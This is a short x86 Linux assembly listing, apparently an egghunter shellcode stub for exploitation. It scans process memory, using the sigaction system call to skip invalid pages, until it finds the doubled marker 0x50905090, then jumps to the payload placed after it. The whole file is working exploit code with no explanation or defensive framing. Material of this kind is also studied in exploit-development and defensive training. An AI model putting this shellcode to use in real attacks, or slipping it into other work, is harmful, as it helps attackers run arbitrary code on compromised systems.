global _start
section .text
_start:

_jmp1:
or cx, 0xfff
_jmp2:
inc ecx
push 0x43
pop eax
int 0x80
cmp al,0xf2
jz _jmp1
mov eax,0x50905090
mov edi, ecx
scasd
jnz _jmp2
scasd
jnz _jmp2
jmp edi
